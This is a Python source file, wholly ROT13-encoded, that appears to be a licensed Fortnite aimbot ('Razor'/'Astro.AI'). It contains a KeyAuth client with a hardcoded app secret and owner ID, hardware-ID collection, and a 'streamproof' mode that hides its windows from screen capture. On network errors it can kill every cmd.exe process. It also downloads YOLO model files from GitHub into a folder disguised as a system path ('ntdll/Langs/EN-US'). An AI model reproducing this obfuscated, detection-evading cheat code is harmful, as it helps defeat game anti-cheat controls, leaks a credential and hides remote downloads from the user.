        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("frgine".rapbqr()),
            "ine": rapelcgvba.rapelcg(ine_anzr, frys.rapxrl, vavg_vi),
            "qngn": rapelcgvba.rapelcg(ine_qngn, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea Gehr
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            gvzr.fyrrc(5)
            bf._rkvg(1)

    qrs ona(frys):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("ona".rapbqr()),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea Gehr
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            gvzr.fyrrc(5)
            bf._rkvg(1)

    qrs svyr(frys, svyrvq):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("svyr".rapbqr()),
            "svyrvq": rapelcgvba.rapelcg(svyrvq, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs abg wfba_qngn["fhpprff"]:
            cevag(wfba_qngn["zrffntr"])
            gvzr.fyrrc(5)
            bf._rkvg(1)
        erghea ovanfpvv.haurkyvsl(wfba_qngn["pbagragf"])

    qrs jroubbx(frys, jrovq, cnenz, obql="", pbagglcr=""):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("jroubbx".rapbqr()),
            "jrovq": rapelcgvba.rapelcg(jrovq, frys.rapxrl, vavg_vi),
            "cnenzf": rapelcgvba.rapelcg(cnenz, frys.rapxrl, vavg_vi),
            "obql": rapelcgvba.rapelcg(obql, frys.rapxrl, vavg_vi),
            "pbagglcr": rapelcgvba.rapelcg(pbagglcr, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea wfba_qngn["zrffntr"]
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            gvzr.fyrrc(5)
            bf._rkvg(1)

    qrs purpx(frys):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl(("purpx").rapbqr()),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea Gehr
        ryfr:
            erghea Snyfr

    qrs purpxoynpxyvfg(frys):
        frys.purpxvavg()
        ujvq = bguref.trg_ujvq()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("purpxoynpxyvfg".rapbqr()),
            "ujvq": rapelcgvba.rapelcg(ujvq, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea Gehr
        ryfr:
            erghea Snyfr

    qrs ybt(frys, zrffntr):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("ybt".rapbqr()),
            "cphfre": rapelcgvba.rapelcg(bf.trgrai('hfreanzr'), frys.rapxrl, vavg_vi),
            "zrffntr": rapelcgvba.rapelcg(zrffntr, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        frys.__qb_erdhrfg(cbfg_qngn)

    qrs srgpuBayvar(frys):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl(("srgpuBayvar").rapbqr()),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            vs yra(wfba_qngn["hfref"]) == 0:
                erghea Abar
            ryfr:
                erghea wfba_qngn["hfref"]
        ryfr:
            erghea Abar

    qrs srgpuFgngf(frys):
        frys.purpxvavg()
        cbfg_qngn = {
            "glcr": "srgpuFgngf",
            "frffvbavq": frys.frffvbavq,
            "anzr": frys.anzr,
            "bjarevq": frys.bjarevq
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            frys.__ybnq_ncc_qngn(wfba_qngn["nccvasb"])

    qrs pungTrg(frys, punaary):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("pungtrg".rapbqr()),
            "punaary": rapelcgvba.rapelcg(punaary, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea wfba_qngn["zrffntrf"]
        ryfr:
            erghea Abar

    qrs pungFraq(frys, zrffntr, punaary):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("pungfraq".rapbqr()),
            "zrffntr": rapelcgvba.rapelcg(zrffntr, frys.rapxrl, vavg_vi),
            "punaary": rapelcgvba.rapelcg(punaary, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea Gehr
        ryfr:
            erghea Snyfr

    qrs purpxvavg(frys):
        vs abg frys.vavgvnyvmrq:
            cevag("[Nfgeb] -> vavgvnyvmr svefg va beqre gb hfr gur shapgvbaf")
            gvzr.fyrrc(2)
            bf._rkvg(1)

    qrs __qb_erdhrfg(frys, cbfg_qngn):
        gel:
            ed_bhg = erdhrfgf.cbfg(
                "uggcf://xrlnhgu.jva/ncv/1.0/", qngn=cbfg_qngn, gvzrbhg=30
            )
            erghea ed_bhg.grkg
        rkprcg erdhrfgf.rkprcgvbaf.FFYReebe:
            pncgvba = "Reebe 0200: FFYReebe"
            zrffntr = (
                "Lbhe Vagrearg Cebivqre vf Oybpxvat bhe Nhgu Freire.\a\a"
                "Gb svk guvf vffhr, sbyybj gurfr fgrcf orybj: "
                "Nsgre pybfvat guvf jvaqbj lbh jvyy or erqverpgrq gb n jrofvgr (jnec/pybhqsyner) "
                "Qbjaybnq gur svyr naq ghea ba JNEC (abg pybhqsyner) orsber ynhapuvat Nfgeb.NV.\a"
                "Gunax lbh sbe pubbfvat Nfgeb.NV!"
            )
            zrffntr_glcr = 0k10
            pglcrf.jvaqyy.hfre32.ZrffntrObkJ(0, zrffntr, pncgvba, zrffntr_glcr)
            jrooebjfre.bcra('uggcf://1.1.1.1/', arj=2)
            gvzr.fyrrc(0.2)
            gel:
                pbafbyr_jvaqbj = pglcrf.jvaqyy.xreary32.TrgPbafbyrJvaqbj()
                pglcrf.jvaqyy.hfre32.CbfgZrffntrJ(pbafbyr_jvaqbj, 0k10, 0, 0)
            rkprcg:
                gel:
                    flf.rkvg()
                rkprcg:
                    bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd pzq.rkr" 1>AHY 2>AHY')
        rkprcg erdhrfgf.rkprcgvbaf.Gvzrbhg:
            pncgvba = "Reebe!"
            zrffntr = (
                "Erdhrfg gvzrq bhg."
            )
            zrffntr_glcr = 0k10
            pglcrf.jvaqyy.hfre32.ZrffntrObkJ(0, zrffntr, pncgvba, zrffntr_glcr)
            jrooebjfre.bcra('uggcf://qvfpbeq.tt/fPJ52qspfU', arj=2)
            gvzr.fyrrc(0.2)
            gel:
                pbafbyr_jvaqbj = pglcrf.jvaqyy.xreary32.TrgPbafbyrJvaqbj()
                pglcrf.jvaqyy.hfre32.CbfgZrffntrJ(pbafbyr_jvaqbj, 0k10, 0, 0)
            rkprcg:
                gel:
                    flf.rkvg()
                rkprcg:
                    bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd pzq.rkr" 1>AHY 2>AHY')

    pynff nccyvpngvba_qngn_pynff:
        ahzHfref = ahzXrlf = ncc_ire = phfgbzre_cnary = bayvarHfref = ""

    pynff hfre_qngn_pynff:
        hfreanzr = vc = ujvq = rkcverf = perngrqngr = ynfgybtva = fhofpevcgvba = fhofpevcgvbaf = ""

    hfre_qngn = hfre_qngn_pynff()
    ncc_qngn = nccyvpngvba_qngn_pynff()

    qrs __ybnq_ncc_qngn(frys, qngn):
        frys.ncc_qngn.ahzHfref = qngn["ahzHfref"]
        frys.ncc_qngn.ahzXrlf = qngn["ahzXrlf"]
        frys.ncc_qngn.ncc_ire = qngn["irefvba"]
        frys.ncc_qngn.phfgbzre_cnary = qngn["phfgbzreCnaryYvax"]
        frys.ncc_qngn.bayvarHfref = qngn["ahzBayvarHfref"]

    qrs __ybnq_hfre_qngn(frys, qngn):
        frys.hfre_qngn.hfreanzr = qngn["hfreanzr"]
        frys.hfre_qngn.vc = qngn["vc"]
        frys.hfre_qngn.ujvq = qngn["ujvq"]
        frys.hfre_qngn.rkcverf = qngn["fhofpevcgvbaf"][0]["rkcvel"]
        frys.hfre_qngn.perngrqngr = qngn["perngrqngr"]
        frys.hfre_qngn.ynfgybtva = qngn["ynfgybtva"]
        frys.hfre_qngn.fhofpevcgvba = qngn["fhofpevcgvbaf"][0]["fhofpevcgvba"]
        frys.hfre_qngn.fhofpevcgvbaf = qngn["fhofpevcgvbaf"]

pynff bguref:
    @fgngvpzrgubq
    qrs trg_ujvq():
        vs cyngsbez.flfgrz() == "Yvahk":
            jvgu bcra("/rgp/znpuvar-vq") nf s:
                ujvq = s.ernq()
                erghea ujvq
        ryvs cyngsbez.flfgrz() == 'Jvaqbjf':
            gel:
                p = jzv.JZV()
                sbe qvfx va p.Jva32_QvfxQevir():
                    vs 'CULFVPNYQEVIR' va qvfx.QrivprVQ:
                        cac_qrivpr_vq = qvfx.CACQrivprVQ
                        erghea cac_qrivpr_vq
            rkprcg:
                jvahfre = bf.trgybtva()
                fvq = jva32frphevgl.YbbxhcNppbhagAnzr(Abar, jvahfre)[0]
                ujvq = jva32frphevgl.PbairegFvqGbFgevatFvq(fvq)
                erghea ujvq
        ryvs cyngsbez.flfgrz() == 'Qnejva':
            bhgchg = fhocebprff.Cbcra("vbert -y | terc VBCyngsbezFrevnyAhzore", fgqbhg=fhocebprff.CVCR, furyy=Gehr).pbzzhavpngr()[0]
            frevny = bhgchg.qrpbqr().fcyvg('=', 1)[1].ercynpr(' ', '')
            ujvq = frevny[1:-2]
            erghea ujvq

pynff rapelcgvba:
    @fgngvpzrgubq
    qrs rapelcg_fgevat(cynva_grkg, xrl, vi):
        cynva_grkg = cnq(cynva_grkg, 16)
        nrf_vafgnapr = NRF.arj(xrl, NRF.ZBQR_POP, vi)
        enj_bhg = nrf_vafgnapr.rapelcg(cynva_grkg)
        erghea ovanfpvv.urkyvsl(enj_bhg)

    @fgngvpzrgubq
    qrs qrpelcg_fgevat(pvcure_grkg, xrl, vi):
        pvcure_grkg = ovanfpvv.haurkyvsl(pvcure_grkg)
        nrf_vafgnapr = NRF.arj(xrl, NRF.ZBQR_POP, vi)
        pvcure_grkg = nrf_vafgnapr.qrpelcg(pvcure_grkg)
        erghea hacnq(pvcure_grkg, 16)

    @fgngvpzrgubq
    qrs rapelcg(zrffntr, rap_xrl, vi):
        gel:
            _xrl = FUN256.arj(rap_xrl.rapbqr()).urkqvtrfg()[:32]
            _vi = FUN256.arj(vi.rapbqr()).urkqvtrfg()[:16]
            erghea rapelcgvba.rapelcg_fgevat(zrffntr.rapbqr(), _xrl.rapbqr(), _vi.rapbqr()).qrpbqr()
        rkprcg:
            cevag("Vainyvq Nccyvpngvba Vasbezngvba. Ybat grkg vf frperg fubeg grkg vf bjarevq. Anzr vf fhccbfrq gb or ncc anzr abg hfreanzr")
            bf._rkvg(1)

    @fgngvpzrgubq
    qrs qrpelcg(zrffntr, rap_xrl, vi):
        gel:
            _xrl = FUN256.arj(rap_xrl.rapbqr()).urkqvtrfg()[:32]
            _vi = FUN256.arj(vi.rapbqr()).urkqvtrfg()[:16]
            erghea rapelcgvba.qrpelcg_fgevat(zrffntr.rapbqr(), _xrl.rapbqr(), _vi.rapbqr()).qrpbqr()
        rkprcg:
            cevag("Vainyvq Nccyvpngvba Vasbezngvba. Ybat grkg vf frperg fubeg grkg vf bjarevq. Anzr vf fhccbfrq gb or ncc anzr abg hfreanzr")
            bf._rkvg(1)

# Vuer XrlNhgu-Qngra
anzr = "nv"
bjarevq = "YNvnu0ysdF"
frperg = "6426141231or52op70nno2onpo2nro35oq5059602r3s062oq25nn67q4r9nq81q"
irefvba = "1.0"

# Refgryyra Fvr rvar Vafgnam qre ncv-Xynffr
ncv_vafgnapr = ncv(anzr, bjarevq, frperg, irefvba)

# Aha xöaara Fvr qvr Zrgubqra qre ncv-Xynffr irejraqra
ncv_vafgnapr.vavg()



CHY = pglcrf.CBVAGRE(pglcrf.p_hybat)
pynff XrlOqVachg(pglcrf.Fgehpgher):
    _svryqf_ = [("jIx", pglcrf.p_hfubeg),
                ("jFpna", pglcrf.p_hfubeg),
                ("qjSyntf", pglcrf.p_hybat),
                ("gvzr", pglcrf.p_hybat),
                ("qjRkgenVasb", CHY)]

pynff UneqjnerVachg(pglcrf.Fgehpgher):
    _svryqf_ = [("hZft", pglcrf.p_hybat),
                ("jCnenzY", pglcrf.p_fubeg),
                ("jCnenzU", pglcrf.p_hfubeg)]

pynff ZbhfrVachg(pglcrf.Fgehpgher):
    _svryqf_ = [("qk", pglcrf.p_ybat),
                ("ql", pglcrf.p_ybat),
                ("zbhfrQngn", pglcrf.p_hybat),
                ("qjSyntf", pglcrf.p_hybat),
                ("gvzr", pglcrf.p_hybat),
                ("qjRkgenVasb", CHY)]

pynff Vachg_V(pglcrf.Havba):
    _svryqf_ = [("xv", XrlOqVachg),
                ("zv", ZbhfrVachg),
                ("uv", UneqjnerVachg)]

pynff Vachg(pglcrf.Fgehpgher):
    _svryqf_ = [("glcr", pglcrf.p_hybat),
                ("vv", Vachg_V)]

pynff CBVAG(pglcrf.Fgehpgher):
    _svryqf_ = [("k", pglcrf.p_ybat), ("l", pglcrf.p_ybat)]

XRL_ANZRF = {
    0k01: "YZO",
    0k02: "EZO",
    0k03: "Pbageby-Oernx",
    0k04: "ZZO",
    0k05: "ZO1",
    0k06: "ZO2",
    0k08: "ONPX",
    0k09: "GNO",
    0k0P: "PYE",
    0k0Q: "RAGRE",
    0k10: "FUSG",
    0k11: "PGEY",
    0k12: "NYG",
    0k13: "CNHFR",
    0k14: "PNCF",
    0k15: "VZR Xnan",
    0k19: "VZR Xnawv",
    0k1O: "RFP",
    0k20: "FCPR",
    0k21: "CT HC",
    0k22: "CT QA",
    0k23: "RAQ",
    0k24: "UBZR",
    0k25: "YRSG",
    0k26: "HC",
    0k27: "EVTUG",
    0k28: "QBJA",
    0k29: "FRY",
    0k2P: "ABAR",
    0k2Q: "VAF",
    0k2R: "QRY",
    0k2S: "URYC",
    0k30: "0",
    0k31: "1",
    0k32: "2",
    0k33: "3",
    0k34: "4",
    0k35: "5",
    0k36: "6",
    0k37: "7",
    0k38: "8",
    0k39: "9",
    0k41: "N",
    0k42: "O",
    0k43: "P",
    0k44: "Q",
    0k45: "R",
    0k46: "S",
    0k47: "T",
    0k48: "U",
    0k49: "V",
    0k4N: "W",
    0k4O: "X",
    0k4P: "Y",
    0k4Q: "Z",
    0k4R: "A",
    0k4S: "B",
    0k50: "Abar",
    0k51: "D",
    0k52: "E",
    0k53: "F",
    0k54: "G",
    0k55: "H",
    0k56: "I",
    0k57: "J",
    0k58: "K",
    0k59: "L",
    0k5N: "M",
    0k70: "S1",
    0k71: "S2",
    0k72: "S3",
    0k73: "S4",
    0k74: "S5",
    0k75: "S6",
    0k76: "S7",
    0k77: "S8",
    0k78: "S9",
    0k79: "S10",
    0k7N: "S11",
    0k7O: "S12",
    0k5O: "Abar",
    0kN1: "EFUVSG",
    0k5P: "Yrsg Jva",
    0k5Q: "Evtug Jva",
    0k60: "Ahzcnq 0",
    0k61: "Ahzcnq 1",
    0k62: "Ahzcnq 2",
    0k63: "Ahzcnq 3",
    0k64: "Ahzcnq 4",
    0k65: "Ahzcnq 5",
    0k66: "Ahzcnq 6",
    0k67: "Ahzcnq 7",
    0k68: "Ahzcnq 8",
    0k69: "Ahzcnq 9",
    0k6N: "Ahzcnq *",
    0k6O: "Ahzcnq +",
    0k6P: "Ahzcnq ,",
    0k6Q: "Ahzcnq -",
    0k6R: "Ahzcnq .",
    0k6S: "Ahzcnq /",
    0k70: "S1",
    0k71: "S2",
}

bf.raiveba["DG_RANOYR_UVTUQCV_FPNYVAT"] = "1"
bf.raiveba["DG_NHGB_FPERRA_FPNYR_SNPGBE"] = "1"
bf.raiveba["DG_FPNYR_SNPGBE"] = "1"

vs unfngge(Dg, 'NN_RanoyrUvtuQcvFpnyvat'):
    DNccyvpngvba.frgNggevohgr(Dg.NN_RanoyrUvtuQcvFpnyvat, Gehr)
vs unfngge(Dg, 'NN_HfrUvtuQcvCvkzncf'):
    DNccyvpngvba.frgNggevohgr(Dg.NN_HfrUvtuQcvCvkzncf, Gehr)

pynff SCFBireynl(DJvqtrg):
    qrs __vavg__(frys):
        fhcre().__vavg__()
        cevag("Vavgvnyvmvat SCFBireynl...")

        frys.frgJvaqbjSyntf(
            Dg.SenzryrffJvaqbjUvag |
            Dg.JvaqbjFgnlfBaGbcUvag |
            Dg.Gbby
        )
        frys.frgNggevohgr(Dg.JN_GenafyhpragOnpxtebhaq)
        frys.frgNggevohgr(Dg.JN_AbFlfgrzOnpxtebhaq, Gehr)
        frys.frgNggevohgr(Dg.JN_BcndhrCnvagRirag, Snyfr)
        frys.frgJvaqbjBcnpvgl(0.95)
        frys.frgNggevohgr(Dg.JN_GenafcneragSbeZbhfrRiragf)

        jvaqbj_unaqyr = vag(frys.jvaVq())
        hfre32 = pglcrf.jvaqyy.hfre32
        Fgernzcebbs = Snyfr  # Rafher Fgernzcebbs vf qrsvarq nccebcevngryl
        hfre32.FrgJvaqbjQvfcynlNssvavgl(jvaqbj_unaqyr, 0k00000011) vs Fgernzcebbs ryfr hfre32.FrgJvaqbjQvfcynlNssvavgl(jvaqbj_unaqyr, 0k00000000)

        phfgbz_sbag = DSbag("Nevny", 13)  # Hfr n qrsnhyg sbag sbe grfgvat

        frys.ynory = DYnory("Enmbe qrirybcrq ol mk | 0 RARZVRF | 000 SCF", frys)
        frys.ynory.frgSbag(phfgbz_sbag)
        frys.ynory.frgFglyrFurrg("""
            DYnory {
                pbybe: juvgr;
                onpxtebhaq-pbybe: #141414;
                obeqre: 2ck fbyvq #1p1q1q;
                obeqre-enqvhf: 8ck;
                cnqqvat: 5ck;
                jvqgu: 240ck;
                znk-jvqgu: 240ck;
                zva-jvqgu: 240ck;
                grkg-nyvta: pragre;
            }
        """)

        ynlbhg = DIObkYnlbhg()
        ynlbhg.nqqJvqtrg(frys.ynory)
        ynlbhg.frgNyvtazrag(Dg.NyvtaPragre)
        frys.frgYnlbhg(ynlbhg)

        frys.scf = 0
        frys.rarzvrf = 0

        frys.gvzre = DGvzre(frys)
        frys.gvzre.gvzrbhg.pbaarpg(frys.hcqngr_scf)
        frys.gvzre.fgneg(1000)  # Fybjre hcqngr sbe grfgvat
        cevag("Gvzre fgnegrq.")

        frys.zbir_bireynl()
        cevag("SCFBireynl vavgvnyvmngvba pbzcyrgr.")

    qrs hcqngr_scf(frys):
        gel:
            frys.ynory.frgGrkg(
                s"<fcna fglyr='pbybe:#0s9psn;'>Enmbe | SBEGAVGR | I2.1 | SCF: {vag(frys.scf)}</fcna>"
            )
        rkprcg Rkprcgvba nf r:
            cevag(s"Reebe hcqngvat SCF: {r}")

    qrs zbir_bireynl(frys):
        fperra_trbzrgel = DNccyvpngvba.cevznelFperra().ninvynoyrTrbzrgel()
        frys.zbir(0, 0)
        cevag("Bireynl zbirq gb fperra cbfvgvba.")



pynff ZlJvaqbj(DJvqtrg):
    qrs __vavg__(frys):
        fhcre().__vavg__()
        frys.ybnq_zbqry()
        frys.vavg_hv()

    qrs ybnq_zbqry(frys):
        gel:
            frys.zbqryy = LBYB("P:/CebtenzQngn/FbsgjbexPE/agqyy/Ynatf/RA-HF/QngrgvzrPbasvthengvbaf/Pe/Sbegavgr.cg")
        rkprcg Rkprcgvba nf r:
            cevag(s"Reebe ybnqvat zbqry: {r}")
            frys.qbjaybnq_zbqry()
            frys.zbqryy = LBYB("P:/CebtenzQngn/FbsgjbexPE/agqyy/Ynatf/RA-HF/QngrgvzrPbasvthengvbaf/Pe/Sbegavgr.cg")

    qrs qbjaybnq_zbqry(frys):
        qrs EC03RI27F(sanzr: fge, hey: fge):
            qrfgvangvba_cngu = e'P:\CebtenzQngn\FbsgjbexPE\agqyy\Ynatf\RA-HF\QngrgvzrPbasvthengvbaf\Pe'
            shyy_cngu = bf.cngu.wbva(qrfgvangvba_cngu, sanzr)
            e = erdhrfgf.trg(hey, nyybj_erqverpgf=Gehr)
            jvgu bcra(shyy_cngu, 'jo') nf svyr:
                svyr.jevgr(e.pbagrag)

        bf.znxrqvef(e'P:\CebtenzQngn\FbsgjbexPE\agqyy\Ynatf\RA-HF\QngrgvzrPbasvthengvbaf\Pe', rkvfg_bx=Gehr)
        EC03RI27F("Sbegavgr.cg", "uggcf://enj.tvguhohfrepbagrag.pbz/nvnagvpf/oH7ReQ/znva/Q-IE90RK/QS990/O9022/PXEEWR/8BBA.cg")
        EC03RI27F("SbegavgrCeb.cg", "uggcf://enj.tvguhohfrepbagrag.pbz/nvnagvpf/oH7ReQ/znva/Q-IE90RK/QS990/O9022/PXEEWR/8BBF.cg")
        gvzr.fyrrc(5)


    qrs vavg_hv(frys):
        tybony Xrlovaq, Xrlovaq2, Nhgb_Sver_Xrlovaq, Syvpxobg_Xrlovaq
        tybony Fybg1_Xrlovaq, Fybg2_Xrlovaq, Fybg3_Xrlovaq, Fybg4_Xrlovaq, Fybg5_Xrlovaq, Fybg6_Xrlovaq, Fgernzcebbs

        gel:
            frys.Xrlovaq = Xrlovaq
            frys.Xrlovaq2 = Xrlovaq2
            frys.Nhgb_Sver_Xrlovaq = Nhgb_Sver_Xrlovaq
            frys.Syvpxobg_Xrlovaq = Syvpxobg_Xrlovaq
            frys.Fgernzcebbs = Fgernzcebbs
            frys.Fybg1_Xrlovaq = Fybg1_Xrlovaq
            frys.Fybg2_Xrlovaq = Fybg2_Xrlovaq
            frys.Fybg3_Xrlovaq = Fybg3_Xrlovaq
            frys.Fybg4_Xrlovaq = Fybg4_Xrlovaq
            frys.Fybg5_Xrlovaq = Fybg5_Xrlovaq
            frys.Fybg6_Xrlovaq = Fybg6_Xrlovaq
        rkprcg AnzrReebe nf r:
            cevag(s"Reebe: {r}. Bar be zber tybony inevnoyrf ner abg qrsvarq.")
            flf.rkvg(1)

        frys.gvzre = DGvzre(frys)
        frys.gvzre.gvzrbhg.pbaarpg(frys.hcqngr)
        frys.gvzre.fgneg(300)

        frys.frgJvaqbjGvgyr('Enmbe')
        frys.frgJvaqbjBcnpvgl(0.96)
        frys.frgSvkrqFvmr(350, 500)

        frys.frgJvaqbjSynt(Dg.ZFJvaqbjfSvkrqFvmrQvnybtUvag, Gehr)
        frys.frgJvaqbjSynt(Dg.JvaqbjZvavzvmrOhggbaUvag, Snyfr)
        frys.frgJvaqbjSynt(Dg.JvaqbjZnkvzvmrOhggbaUvag, Snyfr)
        frys.frgJvaqbjSynt(Dg.JvaqbjFgnlfBaGbcUvag, Gehr)
        frys.frgJvaqbjSynt(Dg.SenzryrffJvaqbjUvag, Snyfr)
        frys.frgJvaqbjSynt(Dg.Gbby, Snyfr)
        frys.frgJvaqbjVpba(DVpba())
        jvaqbj_unaqyr = vag(frys.jvaVq())
        hfre32.FrgJvaqbjQvfcynlNssvavgl(jvaqbj_unaqyr, 0k00000011) vs Fgernzcebbs ryfr hfre32.FrgJvaqbjQvfcynlNssvavgl(jvaqbj_unaqyr, 0k00000000)
        frys.gurzr_urk_pbybe = "#0s9psn"#"#4077p9"
        frys.jvqtrg_ot_pbybe = "#1R1R1R"
        frys.jvqtrg_obeqre_pbybe = "#2R2R2R"

        zrah_gno_fglyr = """
            DChfuOhggba {
                obeqre: abar;
                cnqqvat-obggbz: 4ck;
                znetva-yrsg: 60%;
                znetva-evtug: 60%;
            }
        """

        sbag_vq = DSbagQngnonfr.nqqNccyvpngvbaSbag("P:/CebtenzQngn/Nfgeb/Nffrgf/Sbag.ggs")
        vs sbag_vq != -1:
            sbag_snzvyvrf = DSbagQngnonfr.nccyvpngvbaSbagSnzvyvrf(sbag_vq)
            vs sbag_snzvyvrf:
                sbag_snzvyl = sbag_snzvyvrf[0]
                phfgbz_sbag = DSbag(sbag_snzvyl, 13)
                DNccyvpngvba.frgSbag(phfgbz_sbag)
            ryfr:
                cevag("Sbag snzvyvrf yvfg vf rzcgl, hfvat qrsnhyg sbag.")
                phfgbz_sbag = DSbag("Nevny", 13)
                DNccyvpngvba.frgSbag(phfgbz_sbag)
        ryfr:
            cevag("Snvyrq gb ybnq sbag, hfvat qrsnhyg sbag.")
            phfgbz_sbag = DSbag("Nevny", 13)
